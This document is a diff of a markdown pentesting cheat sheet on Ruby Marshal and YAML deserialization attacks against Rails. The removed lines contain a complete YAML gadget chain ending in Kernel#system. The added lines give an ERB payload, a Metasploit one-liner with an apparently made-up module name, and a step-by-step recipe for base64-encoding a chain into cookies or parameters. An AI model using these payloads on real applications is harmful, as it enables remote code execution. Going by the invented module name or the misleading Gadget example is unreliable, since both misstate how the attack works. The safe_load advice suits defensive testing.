@@ -1,98 +1,129 @@
-# Ruby Deserialization (Marshal)
+# Ruby Deserialization — Marshal + Psych/YAML
 
-## Detection
+## Marshal — `\x04\x08` then a typed object stream
+
 ```
-Raw bytes start with: \x04\x08
-Base64 encoded often starts with: BAh
+\x04\x08          version 4.8 marker
+o:                object   O   object-with-ivars
+u:                usermarshal (marshal_dump/marshal_load)
+U:                userdef (_dump/_load)
+I                 ivars wrapper
+:                 symbol   ;    symbol link
+"                 string
+i                 integer
+[                 array    {    hash
+S:                struct   c    class   m    module   e    extended
 ```
 
-## Marshal.load Exploitation
+`Marshal.load` instantiates classes and calls their load hooks — the same
+"constructor of a chosen class" primitive every deserializer gives.
 
-### Basic Structure
+## The two trigger hooks
+
+| Hook | Fires when | Use |
+|---|---|---|
+| `marshal_load(data)` | class defines `_load`/`marshal_load` and appears as `u:`/`U:` | arbitrary code in the hook |
+| `_load(str)` | `U:` type | same |
+| `initialize` | indirectly via object construction | weaker |
+| `method_missing` | a dispatched call inside a gadget | chain-internal pivot |
+
+## The universal ERB→gadget chain shape
+
+The classic Rails/Ruby RCE (the "universal" gadgets) walks:
+
+```
+ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy
+  → @instance = ERB object with @src = "attacker code"
+  → @method = :result
+  → Deprecation proxies send the method to the ERB instance
+  → ERB#result evaluates @src → your Ruby runs
+```
+
+Versioned variants swap the entry class — `Gem::Requirement`,
+`ActiveSupport::Deprecation`, `Gem::Package::TarReader`, `Net::WriteAdapter`
+combos — the mechanism is always *a trusted object graph whose traversal
+ends in an eval-into-src or system-call.*
+
+## Building the universal payload
+
 ```ruby
-# Vulnerable pattern:
-Marshal.load(user_controlled_data)
+# the shape (concept — use a maintained generator for the real bytes)
+# rails_rce / universal-rce scripts emit the Marshal stream for a target
+# Rails/Ruby version — hand-constructing the ivar graph is fragile
 ```
 
-### Universal RCE Gadget (Rails - ActiveSupport::Deprecation)
-```ruby
-require 'gem'
-
-class Gadget
-  def marshal_dump
-    "custom_data"
-  end
-  def marshal_load(data)
-    system("id")
-  end
-end
-
-payload = Marshal.dump(Gadget.new)
-```
-
-## Rails-Specific Gadget Chains (via known CVEs)
-```ruby
-# Rails 4.x/5.x - ActionController / ActiveSupport gadgets
-# Use tools rather than crafting manually:
-# rails_double_tap_engine or universal-rce gadgets from Ruby community
-
-# Common gadget class: Gem::Requirement / Gem::Installer combos
-```
-
-## YAML Deserialization (More Common Than Marshal in Practice)
-
-### Detection
-```yaml
---- !ruby/object:SomeClass
-attribute: value
-```
-
-### Psych.load vs Psych.safe_load
-```ruby
-# Vulnerable:
-YAML.load(user_input)          # Ruby < 3.1 defaults to unsafe load
-Psych.load(user_input)
-
-# Safe (restricts to basic types):
-YAML.safe_load(user_input)
-```
-
-### RCE via YAML (Universal Gadget - Rails/Ruby)
-```yaml
---- !ruby/object:Gem::Requirement
-requirements:
-  !ruby/object:Gem::Package::TarReader
-  io: &1 !ruby/object:Net::BufferedIO
-    io: &1 !ruby/object:Gem::Package::TarReader::Entry
-     read: 0
-     header: "abc"
-    debug_output: &1 !ruby/object:Net::WriteAdapter
-     socket: &1 !ruby/object:Gem::RequestSet
-      sets: !ruby/object:Net::WriteAdapter
-       socket: !ruby/module 'Kernel'
-       method_id: :system
-      git_set: "id"
-     method_id: :resolve
-```
-(Exact gadget structure is version-dependent - use `universal-rce.rb` scripts from public Ruby security research repos in a lab)
-
-### Rails-Specific YAML Gadget Tools
 ```bash
-# Marshall.dump/YAML gadget generators exist in Metasploit modules
-msfconsole
-use exploit/multi/http/rails_devise_authenticity_token_yaml_rce  # example, verify version match
+# metasploit carries maintained gadgets:
+msfconsole -q -x "use exploit/multi/http/secretwetpy_installer_rce; help"
+# the reusable Ruby script (verify against target Ruby/Rails):
+# https://github.com/... universal_rce.rb  — emits the \x04\x08 stream
 ```
 
-## Testing Checklist
+The practical recipe: detect Rails version (error page, `Gemfile.lock` in
+source, `X-Powered-By`), pick the universal chain variant for that range,
+Marshal-dump the assembled proxy graph, base64 → cookie/param.
+
+## Psych / YAML — the typed-tag path
+
 ```
-1. Identify if Marshal.load or YAML.load(unsafe) is used with user input
-2. Check Rails version (many gadgets are version/gem-dependent)
-3. Try universal RCE gadgets available for the detected Ruby/Rails version
-4. If YAML.safe_load is used, check for permitted_classes bypass (Symbol, Date, etc. allowed by default)
+--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:ActiveSupport::Deprecation
 ```
 
-## Tools
+`YAML.load`/`Psych.load` instantiate `!ruby/object:X` classes — same gadget
+chains as Marshal, different container. `YAML.safe_load` permits only
+`Symbol`, `Date`, `Time`, `Range`, `Regexp`… unless `permitted_classes` adds
+more — a `Symbol`-only safe_load still can't reach an arbitrary class.
+
+```ruby
+# vulnerable:
+YAML.load(user_input)            # Psych < 4 defaults unsafe
+Psych.load(user_input)
+# safe:
+YAML.safe_load(user_input)                        # basic types only
+YAML.safe_load(user_input, permitted_classes:[User]) # whitelisted
 ```
-Metasploit           # Rails-specific deserialization modules
-universal-rce.rb      # Community-maintained Ruby YAML gadgets (verify against target's gem versions)
+
+### The ERB-via-YAML shape
+
+```yaml
+--- !ruby/object:ERB
+src: "<%= `id` %>"
 ```
+
+— only fires if something calls `erb.result`. The real chains embed the ERB
+inside a `DeprecatedInstanceVariableProxy` so a later method call triggers it.
+
+## Second-order Ruby sinks
+
+- **Rails session cookie** (Marshal) — `Rails.application.config.session_store
+  :cookie_store` serializes the session with Marshal under an HMAC. You need
+  `secret_key_base` to forge. If the key leaks (source, `config/secrets.yml`,
+  env, error page) → full Marshal RCE via cookie.
+- **Sidekiq/Resque job payload** — the job class + args are Marshal'd/JSON'd;
+  an attacker-writable job enqueues a gadget.
+- **Rails cache** — `Rails.cache` Marshal's values; a write to the cache
+  poisons the next read.
+- **`dbm`/`PStore`** file the app re-opens.
+
+## The falsifier set
+
+- `Marshal.load` only ever runs on server-generated blobs (signed cookie
+  with unleaked `secret_key_base`) → key-attack problem, not grammar.
+- `YAML.safe_load` with no `permitted_classes` that name a gadget class.
+- Opaque JSON blob — no `!ruby/` tag, no `\x04\x08`.
+
+## Detection recap
+
+```bash
+# base64 cookie → \x04\x08 = Marshal, --- !ruby/ = Psych
+echo -n "$BLOB" | base64 -d | xxd | head -2
+# corrupted \x04\x08 → ArgumentError: dump format error = parser reached
+```
+
+## Output to record
+
+- Marshal vs Psych + Ruby/Rails version that selects the chain
+- The universal-chain variant name and the verbatim response
+- Whether the channel was direct or second-order (session/job/cache)
